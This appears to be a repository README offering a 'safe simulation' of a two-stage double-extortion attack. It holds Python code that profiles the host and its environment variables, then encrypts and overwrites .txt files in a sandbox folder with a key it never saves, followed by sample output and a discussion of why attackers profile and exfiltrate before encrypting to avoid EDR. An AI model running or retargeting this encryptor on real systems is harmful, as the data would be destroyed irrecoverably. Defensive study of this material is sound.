Case Study #1
Behavioral Analysis of a 2-Stage Multi-Extortion Attack Vector

This repository contains a functional, safe simulation of a multi-stage attack vector demonstrating the chronological pipeline of modern "Doxware" or double-extortion campaigns. 
The script is configured to execute strictly within a isolated local sandbox directory 
(`./mock_sandbox_directory`) for educational, defensive analysis, and signature generation.

---
Code Implementation

```python
import os
import platform
import socket
from cryptography.fernet import Fernet

def perform_stage_1_discovery():
    """Simulates Stage 1: Collecting system environment configurations."""
    system_info = {
        "hostname": socket.gethostname(),
        "operating_system": platform.system(),
        "os_release": platform.release(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
    }
    
    target_variables = ["PATH", "USER", "USERNAME", "HOME", "USERPROFILE"]
    env_config = {var: os.environ.get(var) for var in target_variables if var in os.environ}
    
    print("[STAGE 1 LOG] System Hardware Metadata:")
    for key, value in system_info.items():
        print(f"  {key}: {value}")
        
    print("\n[STAGE 1 LOG] Standard Environment Mappings:")
    for key, value in env_config.items():
        print(f"  {key}: {value}")

def perform_stage_2_encryption():
    """Simulates Stage 2: Processing localized file encryption in a sandbox."""
    key = Fernet.generate_key()
    cipher = Fernet(key)
    target_directory = "./mock_sandbox_directory"
    
    print("\n[STAGE 2 LOG] Starting localized mock encryption loop...")
    
    if not os.path.exists(target_directory):
        print(f"[!] Warning: '{target_directory}' folder not found. Create it to see loop run.")
        return

    for root, dirs, files in os.walk(target_directory):
        for file in files:
            if file.endswith(".txt"): 
                file_path = os.path.join(root, file)
                
                with open(file_path, "rb") as f:
                    original_data = f.read()
                
                encrypted_data = cipher.encrypt(original_data)          
                
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)
                    
                print(f"[STAGE 2 LOG] Processed and Encrypted: {file}")

if __name__ == "__main__":
    perform_stage_1_discovery()
    perform_stage_2_encryption()

---
Expected Sandbox Output

When executed inside a controlled environment, the program generates the following structured log telemetry:

```text
[STAGE 1 LOG] System Hardware Metadata:
  hostname: SEC-ANALYST-LAB
  operating_system: Windows
  os_release: 11
  architecture: AMD64
  processor: Intel64 Family 6 Model 158 Stepping 10

[STAGE 1 LOG] Standard Environment Mappings:
  PATH: C:\Windows\system32;C:\Windows;...
  USERNAME: ShadowByte
  USERPROFILE: C:\Users\ShadowByte

[STAGE 2 LOG] Starting localized mock encryption loop...
[STAGE 2 LOG] Processed and Encrypted: local_policy.txt
[STAGE 2 LOG] Processed and Encrypted: network_logs.txt
```

---
 Behavioral Analysis & Case Study

Chronological Flow

Target Profiling (Stage 1)
 The execution flow begins by querying system attributes 
using standard native libraries (`platform`, `socket`, `os`). 
In an actual double-extortion scenario, this provides 
adversaries with immediate environmental validation 
(e.g., verifying they haven't landed in a virtualization 
trap or security vendor sandbox) before pulling down 
configuration files 
or targeting high-value data directories.
Operational Transition

Once host details are logged and network conditions are validated, the program seamlessly transitions from active reconnaissance to the execution phase.
Data Impact (Stage 2)

The script executes a targeted directory walk, reading localized `.txt` assets, processing them via standard symmetric encryption (`Fernet`), and overwriting the original files on disk. 

Strategic Order and Adversarial Logic
This specific sequential layout is critical to the success of a multi-extortion attack vector. 
If a threat actor reverses this sequence
initiating encryption first system performance spikes, high-entropy file writes, and rapid modification alerts will instantly trigger Endpoint Detection and Response (EDR) software. 
This causes the host to be automatically isolated from the local network, cutting off the attacker's network connection entirely. Therefore, silent host profiling and data exfiltration must logically precede disruptive encryption loops to prevent the attack from defeating itself before data leverage is established
